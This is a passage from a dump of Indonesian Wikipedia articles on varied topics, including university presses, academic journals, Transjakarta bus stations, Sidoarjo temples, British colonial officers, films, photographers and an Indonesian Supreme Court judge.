CUP adalah satu dari tiga belas penerbit yang berpartisipasi dalam proyek perintis Knowledge Unlatched, konsorsium pustaka global yang bertujuan mendanai buku akses terbuka. CUP adalah anggota Open Access Scholarly Publishers Association.




</doc>
<doc id="1752452" url="https://id.wikipedia.org/wiki?curid=1752452" title="Kuliner tradisional indonesia">
Kuliner tradisional indonesia

Kuliner tradisional Indonesia adalah semua jenis masakan yang berasal dari berbagai daerah di seluruh Indonesia. Resep dan cara pembuatan kuliner tradisional biasanya bersifat turun temurun. Rasa kuliner tradisional yang khas dari satu daerah akan berbeda dengan daerah lainnya. Itulah kenapa kuliner tradisional Indonesia memiliki banyak keunikan dan kaya akan aneka rasa. Belum ada referensi khusus yang bisa menyebut jumlah pasti kuliner tradisional Indonesia

Indonesia adalah negara kepulauan yang dalam masing masing pulau terdiri dari beberapa kota,yang masih memiliki beberapa daerah di dalam suatu kota. Masing masing kota yang ada di Indonesia memiliki kebudayaan sendiri sendiri. Hal inilah yang membuat Indonesia menjadi salah satu Negara dengan kebudayaan terbanyak di seluruh dunia. Bahkan tidak jarang kebudayaan asli Indonesia yang sangat digemari oleh banyak negara tetangga. Seperti halnya sekelompok mahasiswa belanda yang mempelajari kebudayaan jawa,lebih tepatnya adalah gamelan. Atau bahkan sampai kebudayaan asli Indonesia diakui sebagai kebudayaan asli dari negara lain. Bahkan sampai batik pun sempat di rebutkan antara Indonesia dan Malaysia. Siapa yang benar dialah yang menang,pada akhirnya batik di akui dunia kalau itu adalah asli kebudayaan Indonesaia.
Salah satu kebudayaan yang dimiliki Indonesia adalah kuliner tradisional.Masing masing kota memiliki kuliner tradisional yang berbeda. Perbedaan perbedaan kuliner tradisional Indonesia itu juga masing masing mempunyai ciri khas. Seperti Jawa Tengah yang dikenal dengan rasa manis nya, atau Menado yang dikenal dengan masyarakat yang paling suka dengan rasa pedas,dan lain sebagainya.
Kebudayaan adalah salah satu hal yang wajib terus dilestarikan,begitu juga dengan kuliner tradisional Indonesia yang harus terus dilestarikan dengan cara diperkenalkan kepada generasi muda kita. Jangan sampai generasi muda Indonesia lebih mengenal kuliner dari kebudayaan barat yang sekarang sudah merajalela di Indonesia.
Seperti halnya yang dilakukan oleh beberapa pengusaha kuliner yang mengusung kuliner tradisional. Seperti gudeg Jogja yang sekarang sudah ada kemasan kaleng,atau pempek palembang yang juga sangat banyak digemari,dan lain sebagainya.
Seperti yang kita pernah pelajari dari sejarah nasional Indonesia,bahwa Indonesia ber abad abad lamanya dijajah oleh beberapa negara lain. Salah satu asalan kenapa Indonesia menjadi sasaran jajahan adalah karena mereka menginginkan rempah rempah yang ada di Indonesia. Suatu hal menjadi rebutan banyak orang sudah pasti karena kualitas yang memang bagus. Itu berarti memang kualitas dari rempah rempah di Indonesia adalah salah satu yang terbaik di seluruh dunia.
Bisa kita bayangkan bagamana rasa dari suatu masakan apabila diolah dengan rempah rempah terbaik dunia.Sudah pasti rasanya juga akan sangat mendunia. Hal itu ternyata juga terpikirkan oleh beberapa orang untuk memasarkan makanan Indonesia sampai ke luar negeri. Katakanlah Rangga Umara yang mempunyai bisnis pecel lele dan sudah membuka cabang di beberapa negara tetangga kita.Atau juga Mang Bonu (nama maskot) yang berhasil memasarkan salah satu makanan khas Jawa Barat yang bernama cireng sampai ke Qatar,Malaysia dan negara lainya. Salah satu alasan kenapa masakan asli Indonesia itu bisa diterima dan digilai oleh warga negara lain ya karena masakan masakan itu diolah dengan rempah rempah berkualitas dunia yang dimiliki oleh Indonesia.
buku Sejarah Indonesia madya abad XVI-XIX karya A. Kardiyat Wiharyanto

</doc>
<doc id="1752453" url="https://id.wikipedia.org/wiki?curid=1752453" title="Harvard University Press">
Harvard University Press

Harvard University Press (HUP) adalah rumah penerbit yang didirikan tanggal 13 Januari 1913 sebagai divisi dari Universitas Harvard. Rumah penerbit ini berfokus pada penerbitan akademik. Pada tahun 2005, HUP menerbitkan 220 judul buku. HUP merupakan anggota Association of American University Presses. Direkturnya saat ini adalah William P. Sisler dan pemimpin redaksinya Susan Wallace Boehmer.

Harvard University Press berkantor pusat di Cambridge, Massachusetts, dekat Harvard Square, di New York City, dan London, Inggris.

Penulis-penulis ternama yang karyanya diterbitkan oleh HUP meliputi Eudora Welty, Walter Benjamin, E. O. Wilson, John Rawls, Emily Dickinson, Stephen Jay Gould, Helen Vendler, Carol Gilligan, Amartya Sen, David Blight, Martha Nussbaum, dan Thomas Piketty.

Display Room di Harvard Square yang dikhususkan untuk menjual buku-buku HUP ditutup pada tanggal 17 Juni 2009. HUP menjadi asal nama koma Harvard, karena gaya selingkungnya memiliki penggunaan koma yang khas.

HUP merupakan pemilik imprin Belknap Press yang diluncurkan bulan Mei 1954 seiring diterbitkannya "Harvard Guide to American History". Seri buku John Harvard Library diterbitkan di bawah imprin Belknap.

Harvard University Press merupakan distributor Loeb Classical Library dan penerbit I Tatti Renaissance Library, Dumbarton Oaks Medieval Library, dan Murty Classical Library of India.

Harvard University Press berbeda dengan Harvard Business Press (penerbit milik Harvard Business Publishing) dan penerbit independen Harvard Common Press.

Penelitian tahun 2011 terhadap buku-buku terbitan Harvard University Press pada dasawarsa 2000–2010 yang berkaitan dengan ideologi politik menemukan bahwa dari 494 buku, hanya delapan buku "yang intisarinya cenderung liberal klasik atau konservatif".



</doc>
<doc id="1752455" url="https://id.wikipedia.org/wiki?curid=1752455" title="Diplomatic History (jurnal)">
Diplomatic History (jurnal)

Diplomatic History adalah jurnal akademik telaahan sejawat yang membahas sejarah hubungan luar negeri Amerika Serikat. "Diplomatic History" merupakan jurnal resmi Society for Historians of American Foreign Relations dan diterbitkan oleh Oxford University Press. Jurnal ini dirintis tahun 1977 dan pemimpin redaksinya saat ini adalah Nick Cullather (Universitas Indiana) dan Anne L. Foster (Universitas Negeri Indiana). Menurut "Journal Citation Reports", jurnal ini memiliki faktor pengaruh sebesar 0,267 pada tahun 2012.


</doc>
<doc id="1752457" url="https://id.wikipedia.org/wiki?curid=1752457" title="Ethics &amp; International Affairs">
Ethics &amp; International Affairs

Ethics & International Affairs adalah jurnal akademik telaahan sejawat triwulan yang membahas aspek etika hubungan internasional. Jurnal ini dirintis tahun 1987 dan diterbitkan oleh Cambridge University Press atas nama Carnegie Council for Ethics in International Affairs. Topik-topik yang dibahas dalam jurnal ini beragam, mulai dari keadilan global, demokratisasi, dan hukum internasional, sampai hak asasi manusia dan hak wanita. Pemimpin redaksinya saat ini adalah Joel H. Rosenthal, John Tessitore, Zornitsa Stoyanova-Yerburgh, dan Zach Dorfman (semuanya di Carnegie Council).

Juranl ini terabstrak dan terindeks diThe journal is abstracted and indexed in American Bibliography of Slavic and East European Studies, CSA Worldwide Political Science Abstracts, International Bibliography of the Social Sciences, International Political Science Abstracts, Lancaster Index to Defence & International Security Literature, PAIS International in Print, Philosopher's Index, Social Sciences Index, dan Periodica Islamica.


</doc>
<doc id="1752464" url="https://id.wikipedia.org/wiki?curid=1752464" title="Comodoro Rivadavia">
Comodoro Rivadavia

Comodoro Rivadavia merupakan sebuah kota di Argentina. Kota ini terletak di bagian selatan di negara itu. Tepatnya di Provinsi Chubut. Pada tahun 2010, kota ini memiliki jumlah penduduk sebesar 182.631 jiwa dan memiliki luas wilayah 548,2 km².

Kota ini memiliki angka kepadatan penduduk 330 jiwa/km².



</doc>
<doc id="1752563" url="https://id.wikipedia.org/wiki?curid=1752563" title="Subdistrik Beitang">
Subdistrik Beitang

Beitang (), awalnya juga dikenal sebagai Pei-t'ang dan Pehtang (varian lainnya), adalah sebuah subdistrik di Wilayah Baru Binhai, Tianjin, Tiongkok, yang terletak di dekat mulut Sungai Hai. , subdistrik tersebut mengadministrasikan 2 komunitas tempat tinggal () dan 4 desa.



</doc>
<doc id="1752644" url="https://id.wikipedia.org/wiki?curid=1752644" title="Sungai Hai">
Sungai Hai

Sungai Hai (), yang sebelumnya disebut Bai He (Tionghoa: 白河; pinyin: "Bái Hé"; artinya "Sungai Putih"; Pei Ho dalam sumber-sumber Barat), adalah sebuah sungai di Tiongkok yang melewati Beijing dan Tianjin sebelum masuk ke Laut Kuning di Teluk Bohai.

Sungai Hai di Tianjin terbentuk dari pertemuan lima sungai, Kanal Selatan, Sungai Ziya, Sungai Daqing, Sungai Yongding, dan Kanal Utara. Kanal selatan dan utara adalah bagian dari Kanal Besar. Kanal Selatan bergabung dengan Sungai Wei di Linqing. Kanal Utara bergabung dengan Bai He (atau Sungai Chaobai) di Tongzhou. Kanal Utara (berbagi sebuah pertemuan dengan Bai He) juga merupakan satu-satunya arus air dari laut ke Beijing. Selain itu, orang-orang Barat awal juga menyebut Hai He dengan sebutan Bai He.





</doc>
<doc id="1752646" url="https://id.wikipedia.org/wiki?curid=1752646" title="Charles George Gordon">
Charles George Gordon

Mayor-Jenderal Charles George Gordon, CB (28 Januari 1833 – 26 Januari 1885), juga dikenal sebagai Chinese Gordon, Gordon Pasha, dan Gordon dari Khartoum, adalah seorang perwira angkatan darat dan administrator Britania.

Ia beraksi dalam Perang Krimea sebagai seorang perwira dalam Angkatan Darat Britania. Untuk pelayanan ini, ia dilantik menjadi Chevalier Legiun Kehormatan oleh Pemerintahn Prancis pada 16 Juli 1856. Namun, ia membuat reputasi militernya di China, dimana ia ditempatkan dalam komando "Ever Victorious Army," sebuah pasukan prajurit Tiongkok yang dipimpin oleh perwira Eropa.

Gordon lahir di Woolwich, London, sebagai putra dari Mayor-Jenderal Henry William Gordon (1786–1865) dan Elizabeth (Enderby) Gordon (1792–1873). Ia dididik di Sekolah Fullands di Taunton, Somerset, Sekolah Taunton, dan Akademi Militer Kerajaan, Woolwich. Ia diangkat pada 1852 sebagai letnan kedua dalam Teknisi Kerajaan, menyelesaikan pelatihannya di Chatham. Ia diangkat menjadi letnan penuh pada 1854.





</doc>
<doc id="1752648" url="https://id.wikipedia.org/wiki?curid=1752648" title="The Judge (film 2014)">
The Judge (film 2014)

The Judge adalah sebuah film drama Amerika 2014 yang disutradarai oleh David Dobkin. Film tersebut dibintangi oleh Robert Downey, Jr., Robert Duvall, Vera Farmiga, Vincent D'Onofrio, Jeremy Strong, Dax Shepard, dan Billy Bob Thornton. Film tersebut dirilis di Amerika Serikat pada 10 Oktober 2014..

Duvall meraih beberapa nominasi penghargaan karena penampilannya sebagai Hakim Joseph Palmer, yakni Academy Award, Golden Globe Award, Screen Actors Guild Award, dan Satellite Award untuk Aktor Pendukung Terbaik. Thomas Newman juga meraih nominasi Satellite Award untuk Skor Asli Terbaik.

Hank Palmer (Robert Downey Jr.) adalah seorang jaksa pertahanan yang berhasil di Chicago yang jauh dari keluarganya di sebuah kota kecil di Indiana selama beberapa tahun. Saudaranya Glen (Vincent D'Onofrio) meneleponnya dengan berita bahwa ibu mereka telah meninggal.

Skripnya aslinya ditulis oleh Nick Schenk. Pada Maret 2011, skriptnya ditulis ulang oleh David Seidler. Pada April 2013, Bill Dubuque memutuskan untuk menulis ulang skrip tersebut. Pemilihan Robert Duvall, Vincent D'Onofrio, Vera Farmiga, dan Dax Shepard untuk berperan dalam film tersebut dikabarkan pada Maret 2013.

Fotografi prinsipal dimulai pada 31 Mei 2013 di Shelburne Falls, Massachusetts. Pengambilan gambarnya juga dilakukan di Attleboro, Belmont, Dedham, Sunderland, dan Waltham, Massachusetts. Latar belakangnya juga difilmkan di Pennsylvania dan Worcester, Massachusetts. Film tersebut berlatar belakang kota fiksi Carlinville, Indiana. Pemfilmannya juga dilakukan di toko It's About Time Clock, sebuah toko antik bisnis kecil di Millers Falls, Massachusetts. Tempat tersebut adalah lokasi sebenarnya dari toko antik dalam film tersebut.

Pada 27 Februari 2014, Thomas Newman ditunjuk untuk mengkomposisi musik untuk film tersebut. WaterTower Music merilis sebuah album soundtrack pada 7 Oktober 2014. Lagu penutup film tersebut menampilkan versi Willie Nelson dari lagu Coldplay "The Scientist".

Film tersebut ditampilkan di malam pembukaan Festival Film Internasional Toronto 2014 pada 4 September 2014. Film tersebut tayang perdana di Los Angeles pada 1 Oktober di Academy of Motion Picture Arts and Sciences di Beverly Hills. Film tersebut dirilis pada 10 Oktober 2014 di Amerika Serikat.

"The Judge" meraih $83.5 juta di seluruh dunia. Film tersebut meraih $13,116,226 di Amerika Utara di minggu pembukaannya, ditayangkan di 3,003 bioskop untuk rata-rata per bioskop $4,368 dan menempati urutan ke-5 pada jajak pendapat CinemaScore yang diadakan saat minggu pembukaannya di mana para penonton bioskop memberikan "The Judge" rata-rata peringkat "A-" pada skala A+ sampai F. Pemasaran terbesar di wilayah lainnya adalah Rusia, Italia dan Meksiko, di mana film tersebut pada negara masing-masing meraih $4.4 juta, $2.99 juta dan $2.84 juta.



</doc>
<doc id="1752651" url="https://id.wikipedia.org/wiki?curid=1752651" title="Pancoran Tugu (Transjakarta)">
Pancoran Tugu (Transjakarta)

Pancoran Tugu adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen MT Haryono, Tebet Barat, Tebet, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Tugu Dirgantara yang terletak di sebelah stasiun BRT.



</doc>
<doc id="1752653" url="https://id.wikipedia.org/wiki?curid=1752653" title="Garnet Wolseley, Viscount Wolseley ke-1">
Garnet Wolseley, Viscount Wolseley ke-1

Panglima Besar Garnet Joseph Wolseley, Viscount Wolseley ke-1, (4 Juni 1833 – 25 Maret 1913) adalah seorang perwira Inggris-Irlandia dalam Angkatan Darat Britania. ia bertugas di Burma, Perang Krimean, Munitas India, China, Kanada dan sebagian besar Afrika — termasuk kampanye Ashanti-nya (1873–1874) dan Ekspedisi Nil melawan Mahdist Sudan pada 1884–85. Ia menjabat sebagai Ketua Komandan Pasukan dari 1895 sampai 1900. Reputasinya yang baik membuat pada akhir abad ke-19 terdapat frasa Inggris "semua Sir Garnet adalah segalanya", yang artinya "semuanya adalah dalam perintah."

Lahir sebagai putra sulung dari Mayor Garnet Joseph Wolseley dari "Batas-Batas Skotlandia Milik Raja" (Kaki ke-25) dan Frances Anne Wolseley (née Smith), Wolseley dididik di Dublin dan pertama kali bekerja dalam sebuah kantor penyelamat.

Wolseley menikah pada 1867 dengan Louisa (1843–1920), putri dari Mr. A. Erskine. Anak tunggalnya, Frances (1872–1936) adalah seorang penulis dan pendiri College for Lady Gardeners di Glynde.




</doc>
<doc id="1752655" url="https://id.wikipedia.org/wiki?curid=1752655" title="Pancoran Barat (Transjakarta)">
Pancoran Barat (Transjakarta)

Pancoran Barat adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jenderal Gatot Subroto, Menteng Dalam, Tebet, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.



</doc>
<doc id="1752663" url="https://id.wikipedia.org/wiki?curid=1752663" title="Candi Pamotan">
Candi Pamotan

Candi Pamotan adalah dua (sisa) bangunan peninggalan masa klasik yang terletak di Kecamatan Porong, Kabupaten Sidoarjo, Jawa Timur.

Candi ini berlokasi di desa Pamotan, Porong, Sidoarjo]], Kecamatan Porong, Kabupaten Sidoarjo, Jawa Timur. Kedua candi berjarak 50 meter, Candi Pamotan I adalah yang berukuran lebih besar. Keduanya telah termasuk bangunan cagar budaya oleh pemerintah Kabupaten Sidoarjo.

Walujo BA, penilik kebudayaan, dalam catatannya menyebutkan, Candi Pamotan diteliti pertama kali oleh GLA Brandes, orang Belanda, pada tahun 1903. Namun, hingga 1921 candi ini tak pernah dikunjungi para ahli. Baru tahun 1923 NJ Krom, ahli purbakala, menulis tentang candi ini.

Menurut Krom, bentuk profil Candi Pamotan lazim digunakan pada candi-candi di Jawa Timur. Candi ini memiliki gaya periode Majapahit.

Candi Pamotan II ditemukan sekitar 50 meter dari penemuan candi yang pertama, berupa tumpukan batu bata mirip candi. Candi tersebut belum punya nama, sehingga disebut Candi Pamotan II.

Candi Pamotan terletak di dekat Candi Pari.

Candi Pamotan merupakan candi yang sederhana. Dibuat dari bata merah, yang dikelilingi lubang berbentuk persegi panjang yang tergenang air bila hujan. Ukuran kedua candi hampir berbentuk persegi (bujursangkar). Candi Pamotan I memiliki panjang 4,84 meter dan lebar 4,78 meter. Candi Pamotan II berukuran 4,75 meter panjang dan 4,30 meter lebar. Kondisi Candi Pamotan II lebih parah dibadingkan Candi Pamotan pertama.

Arca yang berada di Candi Pamotan II telah hilang kepalanya. Candi Pamotan II sebagian besar batu batanya telah rusak termakan usia tetapi sementara ini hanya sedikit saja yang dipugar, Sementara itu, di Candi Pamotan I di bagian timur dinding candi ada lubang yang sangat besar. Pemugaran hanya dilakukan secara perlahan - lahan.



</doc>
<doc id="1752669" url="https://id.wikipedia.org/wiki?curid=1752669" title="Candi Dermo">
Candi Dermo

Candi Dermo adalah sebuah peninggalan masa klasik yang terletak di Kabupaten Sidoarjo

Candi ini berlokasi di Wonoayu, Kabupaten Sidoarjo, Jawa Timur, Candi ini termasuk dalam cagar budaya.

Catatan mengenai candi dermo yang pertama dapat dilihat pada laporan Belanda yang ditulis pada tahun 1905 – 1913 dan 1914 – 1915. Untuk mengetahui kapan dan oleh siapa candi ini dibuat atau dibangun belum dapat dipastikan dan diketahui sebab memang belum ada sumber secara tertulis atau angka tahun yang menyebutkannya, hanya saja dari segi bangunannya para ahli menduga candi darmo berasal dari abad ke 14.

Secara keseluruhan candi dermo merupakan gapura yang berbentuk garuda padu raksa yang dalam ilmu kepurbakalaan yaitu gapura yang bagian atasnya (atap) menjadi satu.
Sebab ada gapura lain yang bentuk atasnya terpisah seolah – olah ditarik ke kanan dan ke kiri. Bentuk gapura yang atapnya terpisah seperti itu di dalam kepurbakalaan disebut candi benta atau gapura bela.
Gapura atau candi dermo ini hampir serupa dengan gapura bajang ratu bekas peninggalan majapahit yang ada di Trowulan.
Pintu masuk candi dermo mengarah pada poros barat timur dari bagian – bagian yang tersisa untuk diketahui bahwa dulunya gapura ini mempunyai pagar tembok atau sayap.

Candi ini belum pernah di pugar sejak di bangun, candi ini direncanakan akan memulai pemugaran pada tahun 2014, pemugaran mengalami penundaan dan akan dimulai pada tahun 2015.


</doc>
<doc id="1752675" url="https://id.wikipedia.org/wiki?curid=1752675" title="Candi Tawangalun">
Candi Tawangalun

Candi Tawangalun adalah peninggalan masa klasik yang terletak di Kabupaten Sidoarjo.

Candi ini berlokasi di Sedati, Kabupaten Sidoarjo, Jawa Timur, Candi ini termasuk dalam cagar budaya.

"Candi ini merupakan candi peninggalan yang paling di anak tirikan oleh pemerintah", kata Pak Saiful juru kunci dan yang bertugas merawat candi peninggalan kerajaan Mojopahit ini. "Bila dilihat mulai dari papan nama, papan peringatan dan juga pagarpun tidak ada sama sekali", ujar pak Saiful yang sudah 10 tahun menjadi juru kunci candi.
Candi Tawangalun ini sangat berbeda dengan candi-candi yang ada di Sidoarjo pada umumnya karena candi Tawangalun ini berada di perbukitan tidak seperti candi lainnya yang berada di area pemukiman warga. Candi ini berbentuk seperti atap rumah berbentuk trapesium.

Candi ini di pugar di bagian atap candi yang sudah banyak jatuh. Candi tersebut juga di pugar di bagian dinding candi, walaupun masih sedikit yang rusak.


</doc>
<doc id="1752694" url="https://id.wikipedia.org/wiki?curid=1752694" title="Tegal Parang (Transjakarta)">
Tegal Parang (Transjakarta)

Tegal Parang adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jenderal Gatot Subroto, Kuningan Timur, Setiabudi, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.




</doc>
<doc id="1752700" url="https://id.wikipedia.org/wiki?curid=1752700" title="Gatot Subroto Jamsostek (Transjakarta)">
Gatot Subroto Jamsostek (Transjakarta)

Gatot Subroto Jamsostek adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jenderal Gatot Subroto, Kuningan Timur, Setiabudi, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Menara Jamsostek yang berada di sebelah selatan stasiun BRT.




</doc>
<doc id="1752705" url="https://id.wikipedia.org/wiki?curid=1752705" title="Gatot Subroto LIPI (Transjakarta)">
Gatot Subroto LIPI (Transjakarta)

Gatot Subroto LIPI adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jenderal Gatot Subroto, Senayan, Kebayoran Baru, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Gedung LIPI yang berada di sebelah selatan stasiun.




</doc>
<doc id="1752710" url="https://id.wikipedia.org/wiki?curid=1752710" title="Daftar Bupati Jombang">
Daftar Bupati Jombang

<onlyinclude>Berikut adalah Daftar Bupati Jombang dari masa ke masa.
</onlyinclude>



</doc>
<doc id="1752718" url="https://id.wikipedia.org/wiki?curid=1752718" title="Kily González">
Kily González

Kily González () adalah seorang pemain sepak bola Argentina. Ia berposisi sebagai Sayap. Terakhir ia bermain untuk Rosario Central dan pernah bermain untuk .

Kily González pernah bermain untuk Boca Juniors, Zaragoza, Valencia, Internazionale, dan San Lorenzo. Ia mengakhiri karier di klub pertamanya, Rosario Central.

Kily González merupakan pemain sejak 1995, dan melakukan debutnya pada 8 November saat kekalahan kandang 0–1 atas . Total ia telah bermain 56 kali untuk , dan telah mencetak 9 gol. Ia turut bermain untuk Argentina dalam Piala Dunia FIFA 2002.



</doc>
<doc id="1752735" url="https://id.wikipedia.org/wiki?curid=1752735" title="James Bruce, 8th Earl of Elgin">
James Bruce, 8th Earl of Elgin

James Bruce, 8th Earl of Elgin dan 12th Earl of Kincardine, KT, GCB, PC (20 Juli 1811 – 20 November 1863), adalah seorang administrator dan diplomat kolonial Britania. Ia merupakan Gubernur Jenderal Provinsi Canada, Komisionar Tinggi dalam terbentuknya perdagangan terbuka di China dan Jepang, dan Viceroy India. Sebagai Komisioner Tinggia Britania di China pada Perang Candu Kedua, setelah menyerang China, ia memerintahkan penghancuran Istana Musim Panas Kuno di Beijing pada 1860.

Lord Elgin adalah putra dari 7th Earl of Elgin dan 11th Earl of Kincardine dan istri keduanya. Istri Elgin, Lady Mary Lambton, adalah putri dari 1st Earl of Durham, seorang penulis berpengaruh dari "Report on the Affairs of British North America (1839)", dan kemenakan dari Sekretaris Kolonial 3rd Earl Grey.

Ia sama-sama lahir pada 20 Juli dengan ayahnya. Ia memiliki tujuh saudara dan saudari dan empat saudari seayah dan satu saudara seayah dari pernikahan pertama ayahnya.

James Bruce dididik di Eton College dan Christ Church, Oxford, lulus dengan gelar pertama dalam bidang ilmu Klasik pada 1832. Ketika di Oxford, ia berteman dengan William Ewart Gladstone.





</doc>
<doc id="1752748" url="https://id.wikipedia.org/wiki?curid=1752748" title="Baron Raimund von Stillfried">
Baron Raimund von Stillfried

Baron Raimund von Stillfried, juga dikenal sebagai Baron Raimund von Stillfried-Rathenitz (6 Agustus 1839, Komotau  – 12 Agustus 1911, Vienna), adalah seorang fotografer Austria.

Ia adalah putra dari August Wilhelm Freiherr Stillfried von Rathenitz (m. 1806) dan Maria Anna Johanna Theresia Walburge Gräfin Clam-Martinitz (1802–1874).

Setelah meninggalkan karier militernya, Stillfried berpindah ket Yokohama, Jepang dan membuka sebuaha studio fotografi yang bernama "Stillfried & Co." yang beroperasi sampai 1875. Pada 1875, Stillfried membuat sebuah kerjasama dengan Hermann Andersen dan studio tersebut berganti nama menjadi "Stillfried & Andersen" (juga dikenal sebagai "Asosiasi Fotografi Jepang"). Studio ini beroperasi sampai 1885.



</doc>
<doc id="1752750" url="https://id.wikipedia.org/wiki?curid=1752750" title="Always Kabhi Kabhi">
Always Kabhi Kabhi

Always Kabhi Kabhi (artinya 'Selalu Kadang-Kadang') adalah sebuah film percintaan Hindi 2011 yang disutradarai oleh Roshan Abbas, dan diproduksi oleh Shahrukh Khan dibawah spanduk Red Chillies Entertainment. Film tersebut mengenalkan Ali Fazal, bersama dengan Giselli Monteiro sementara Zoa Morani, Satish Shah, Lilette Dubey, Vijay Raaz, Mukesh Tiwari dan Manoj Joshi memainkan peran pendukung. Film tersebut dirilis pada 17 Juni 2011. Film tersebut berkisah tentang empat remaja yang melakukan perjalanan dramatis pada tahun terakhir sekolah yang diwarnai dengan insiden.


Musik tersebut dikomposisikan oleh Pritam Chakraborty, Aashish Rego dan Shree D. Lyrics yang ditulis oleh sutradara film Roshan Abbas, Amitabh Bhattacharya, Irfan Siddique dan Prashant Pandey. Lagu "Antenna" menampilkan Shahrukh Khan sebagai tamu istimewa.

"Always Kabhi Kabhi" mendapatkan keuntungan bersih sebesar 30.5 juta di India pada akhir penayangan bioskop. Film tersebut dideklarasikan sebagai sebuah flop oleh "Box Office India" Di luar negeri, film tersebut mendapatkan $21,381 dari Amerika Serikat, $46,469 dari Britania Raya, $9,803 dari Afrika Selatan dan $2,893 dari Malaysia.



</doc>
<doc id="1752754" url="https://id.wikipedia.org/wiki?curid=1752754" title="Kusakabe Kimbei">
Kusakabe Kimbei

Kusakabe Kimbei (日下部 金兵衛) (1841–1934) adalah seorang fotografer Jepang. Ia biasanya dipanggil dengan nama panggilannya, Kimbei, karena para pelanggannya kebanyakan adalah penduduk asing dan pengunjung yang tidak menggunakan bahasa Jepang.

Kusakabe Kimbei bekerja dengan Felice Beato dan Baron Raimund von Stillfried sebagai seorang pemberi warna fotografi dan asisten sebelum membuka toko karyanya sendiri di Yokohama pada 1881, di perempatan Benten-dōri, dan dari 1889 mengoperasikan perempatan Honmachi. Ia juga membuka sebuah cabang di perempatan Ginza di Tokyo.

Sekitar 1885, ia mengakuisi foto negatif dari Felice Beato dan dari Stillfried, serta beberapa dari Uchida Kuichi. Kusakabe juga mengakuisisi beberapa foto negatif Ueno Hikoma dari Nagasaki.




</doc>
<doc id="1752761" url="https://id.wikipedia.org/wiki?curid=1752761" title="Roger Fenton">
Roger Fenton

Roger Fenton (28 Maret 1819 – 8 Agustus 1869) adalah seorang perintis fotografi Britania, salah satu dari war photographers pertama.

Roger Fenton lahir di Crimble Hall, Bury, Lancashire, pada 20 Maret 1819. Kakeknya adalah pemilik pabrik kapas dan banker, ayahnya seorang banker dan Anggota Parlemen. Fenton adalah anak keempat dari tujug bersaudara dari pernikahan pertama ayahnya. Ayahnya memiliki lebih dari 10 anak dari istri keduanya.



</doc>
<doc id="1752762" url="https://id.wikipedia.org/wiki?curid=1752762" title="SMK Puja Bangsa">
SMK Puja Bangsa

Sekolah Menengah Kejuruan (SMK) Puja Bangsa adalah sekolah yang menyelenggarakan pendidikan kejuruan kelompok teknologi dan informasi.

Setiap sekolah pasti memiliki sejarah pada saat didirikan. Demikian pula SMK Puja Bangsa. Mulai dari belum memiliki gedung sendiri sampai berkembang seperti sekarang.

Cikarang sebagai Ibu Kota Kabupaten Bekasi dan juga sebagai Kota Industri Terbesar di Indonesia berada sebelah timur Jakarta berpeluang besar menyelenggarakan pendidikan sesuai dengan tuntutan masyarakatnya. Untuk menjawab tuntutan masyarakat Bekasi maka pada tahun 1962 memprakarsai berdirinya SMK Puja Bangsa yang pada saat itu masih menumpang di gedung SMP Negeri 3 selama satu setengah tahun dan sebagai filial dari SMA Negeri Bekasi.

Lokasi SMK Puja Bangsa berada di Jl. Sawo No. 24 Cikarang Telp. (021) 89101234. Fax. 89101235, Kelurahan Cikarang Kota Kecamatan Cikarang Utara Kabupaten Bekasi.

Terdapat jurusan yang telah ada yaitu:

Situs Website SMK Puja Bangsa


</doc>
<doc id="1752764" url="https://id.wikipedia.org/wiki?curid=1752764" title="Djoko Sarwoko">
Djoko Sarwoko

Djoko Sarwoko SH, MH adalah seorang Pejabat Hukum yang kini menduduki jabatan Ketua Muda Pidana Khusus Mahkamah Agung Republik Indonesia periode 2009-2014.

Ia dilantik pada "17 April 2009" di Ruang Kusuaatmadja, Gedung Mahkamah Agung RI bersama pelantikan lima Ketua Muda Mahkamah Agung RI lainnya. Sebelum jabatan ini, Djoko Sarwoko menjabat sebagai "Ketua Muda Pengawasan Mahkamah Agung."

Djoko Sarwoko kalah suara pada rapat paripurna Mahkamah Agung dalam pemilihan Ketua MA tahun 2009. Pria yang genap berusia 67 tahun di 2009 itu hanya mampu mengantongi 3 suara, sedangkan Harifin A Tumpa mendapat 36 dari total 43 suara.

Dalam rapat pemilihan Wakil Ketua MA, Djoko Sarwoko juga masih gagal. Enam suara miliknya masih kalah jauh dari Abdul Kadir Mappong (23 suara) dan Ahmad Kamil (25 suara) yang akhirnya membawa keduanya memangku jabatan masing-masing sebagai Wakil Ketua MA Bidang Yudisial dan Wakil Ketua MA Bidang Non Yudisial.

Saat menjabat sebagai Ketua Muda Bidang Pengawasan, nama Djoko Sarwoko sempat marak di berbagai media. Ia dituduh telah melakukan Interversi terhadap suatu perkara. Saat itu Pengadilan Negeri (PN) Jakarta Pusat mengatakan tidak berwenang dalam menangani perkara hukum antara Sugar Group Companies dan Marubeni Corporation. Kemudian terjadilah banding dan diputuskan PN tetap berwenang. Setelah kasasi, justru malah menguatkan putusan pengadilan banding tersebut.

Menurut Presiden Kongres Advokat Indonesia H Indra Sahnun Lubis SH pada waktu itu, Djoko Sarwoko memang disengaja akan dijatuhkan karena dianggap sebagai penghalang. Dikarenakan merupakan Hakim Agung yang tegas dan tidak mau disuap. Djoko Sarwoko juga dinilai sangat respek terhadap laporan masyarakat apabila ada penyimpangan.

Bulan "Desember 2009," Djoko dipanggil Komisi Yudisial terkait masalah ini. Namun dirinya terpaksa absen karena kesibukan MA dan baru pulang dari Prancis. Awal 2010, Djoko kembali dijadwalkan akan diperiksa Komisi Yudisial sekaligus menanyai mengenai pemberitaan majalah Gatra yang menyebutkan dirinya ditawari dana Rp. 5 miliar untuk memenangkan salah satu pihak dalam perkara tersebut. Sayangnya, panggilan ini masih juga tidak dipenuhi.

